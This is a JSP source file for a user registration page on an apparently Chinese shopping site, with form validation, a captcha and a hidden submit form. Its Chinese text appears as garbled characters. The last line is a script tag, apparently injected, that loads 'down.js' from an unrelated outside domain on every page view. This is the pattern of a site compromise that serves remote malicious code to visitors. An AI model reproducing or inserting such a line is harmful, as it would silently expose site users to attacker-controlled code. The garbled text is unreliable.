<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="��������-�û�ע��"/> 
<%@ include file="IncludeTop.jsp" %>

<script type="text/javascript">
<!--
var w_wait;
function checksignup() {
    if(! document.all.read_flag.checked){
	     alert("�������Ķ������˵�ע������");
		 document.all.read_flag.focus();
		 return false;
	}

   if(validate(document.all.check_sum, 'У����', 'public', 4,  8, false) &&
      validate(document.all.signup_uid, '�û�ID', 'identifier', 4, 32, false) &&
	  validate(document.all.signup_pwd, '����', 'public', 6, 64, false)&&
	  validate(document.all.signup_email, 'Email', 'email', 0, 64, false)){
	        if(document.all.signup_pwd.value != document.all.signup_pwd2.value){
			     alert("�����������벻һ��");
				 document.all.signup_pwd.focus();
			     return false;
			}
			w_wait = window.open("about:blank", "waiting", "width=300,height=150");
			w_wait.document.write("<center>����ע�ᣬ���Ժ򡭡�</center>");
			document.all.registerform.userid.value=document.all.signup_uid.value;
			document.all.registerform.password.value=document.all.signup_pwd.value;
			document.all.registerform.email.value=document.all.signup_email.value;
			document.all.registerform.checksum.value=document.all.check_sum.value;
			document.all.registerform.submit();			
			return true;
		}
	  return false;
}
	
function CheckUser(){	
		if(validate(document.all.signup_uid, '�û�ID', 'identifier', 0, 32, false)){
			window.open('<c:url value="/register.do"/>?userid='+document.all.signup_uid.value+'&&ischeck=true','','width=292,height=180,left=200,top=150,toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no,status=no');
	   }				
}


window.onunload=window_onunload;

function window_onunload() {
	if (w_wait){
		w_wait.close();
	}
}

//-->
</script>


<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" valign="top"> 
      <%@ include file="searchProductBar.jsp" %>
      <%@ include file="searchAllBar.jsp" %>
      <%@ include file="newsBar.jsp" %>    </td>
    <td width="602" bgcolor="#FFFFFF" valign="top">
      <table  width="100%" height="61" border="0" cellpadding="0" cellspacing="0">
        <tr > 
          <td align="center">&nbsp;</td>
        </tr>
        <tr> 
          <td align="center" class="black12"><font color="#003399" class="red15" >���������ʺ�</font></td>
        </tr>
        <tr> 
          <td align="center" class="black12">&nbsp;</td>
        </tr>
        <tr> 
          <td align="center" class="black12"> 
            <p>�����������ı���������Ϊ���˻�Ա���õ�<span class="red">1000��</span>���˻�����</p>          </td>
        </tr>
      </table>
      <table width="100%" border="0" cellpadding="0" cellspacing="3">
        <tr> 
          <td colspan="2" align="center" class="black12" >&nbsp;</td>
        </tr>

        <tr>
          <td align="RIGHT" class="black12" >&nbsp;</td>
          <td class="black12">&nbsp;</td>
        </tr>
        <tr> 
          <td align="RIGHT" class="black12" ><font color="#FF0000">*</font>�����˺ţ�</td>
          <td class="black12"> 
            <input name="signup_uid" maxlength="32" class="medium" size="20">
            <input type="button" value="����û����Ƿ����" style="width:150px;font-size:12px;color:navy" onClick="javascript:CheckUser()" name="btnCheckUser">          </td>
        </tr>
        <tr> 
          <td width="109" class="black12">&nbsp;</td>
          <td class="black12"><font color="#666666" class="small">�Ϸ����û���Ӧ����<b><font color="#CC0000">a-z��Ӣ����ĸ�������ִ�Сд����0-9�����ֻ��»���</font></b>��ɣ�����Ӣ����ĸ��ͷ�����磺johnson168</font></td>
        </tr>
        <tr> 
          <td height="23" align="RIGHT" class="black12" "><font color="#FF0000">*</font><font class="medium">���룺</font></td>
          <td bordercolor="#FFCC33" class="black12"> 
            <input name="signup_pwd" type=password id=upwd size=20 maxlength=12 >		  </td>
        </tr>
        <tr> 
          <td height="24" align="RIGHT" class="black12"><font color="#FF0000">*</font><font class="medium">����һ�����룺</font></td>
          <td class="black12"> 
            <input type="PASSWORD" name="signup_pwd2" maxlength="64" class="medium" size="20">          </td>
        </tr>
        <tr> 
          <td width="109" align="RIGHT" class="black12"><font color="#FF0000">*</font><font class="medium">�����ʼ���</font></td>
          <td class="black12"> 
            <input name="signup_email" size="30" maxlength="64" class="medium">          </td>
        </tr>
        <tr> 
          <td height="20" align="RIGHT" class="black12">&nbsp;</td>
          <td class="black12"><font color="#666666">ע����Ͻ���һ��<font color="#CC0000"><b>ȷ����</b><font color="#666666">��������������</font></font></font></td>
        </tr>
        <tr>
          <td height="23" align="right" class="black12"><font color="#FF0000">*</font><font class="medium"></font>У���룺</td>
          <td class="black12"><img src='<c:url value="/checkSumImg.do"/>' width="75" height="20" /></td>
        </tr>
        <tr>
          <td height="21" align="right" class="black12"><font color="#FF0000">*</font><font class="medium"></font>����У���룺</td>
          <td class="black12"><input name="check_sum" maxlength="8" class="medium" size="20" />          </td>
        </tr>
        <tr>
          <td align="RIGHT" class="black12">&nbsp;</td>
          <td class="black12">&nbsp;</td>
        </tr>
        <tr> 
          <td align="RIGHT" class="black12">ע������:</td>
          <td width="484" class="black12"> 
            <input type="checkbox" name="read_flag" value="checkbox">
            ������ϸ�Ķ������ܻ������˵�<a href='<c:url value="/protocol.screen"/>' >ע������</a>��</td>
        </tr>		
        <tr> 
          <td align="RIGHT" class="black12">&nbsp;</td>
          <td class="black12">&nbsp;</td>
        </tr>
      </table>
      <table width="100%" border="0">
        <tr> 
          <td width="214" align="right" height="32"> 
            <input type=button value="�� ��" class="medium" onClick="javascript:return checksignup()" name="signup_submit">          </td>
          <td width="346" height="32"> 
            <input type=RESET value="�� ��" class="medium" name="signup_reset">          </td>
        </tr>
      </table>
      <c:set var="trBegin" value='<tr>' /> <c:set var="trEnd" value='</tr>' /> 
      <c:set var="colomnSize" value="2" /> </td>
  </tr>
</table>
<form  name="registerform" id="registerform" method="post" action='<c:url value="/register.do"/>'>
	<input id="userid" type="hidden" name="userid"  value="">
	<input name="password" type="hidden" id="password" value=''>
	<input name="email" type="hidden" id="email" value=''>
	<input name="checksum" type="hidden" id="checksum" value=''>	
</form>
<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>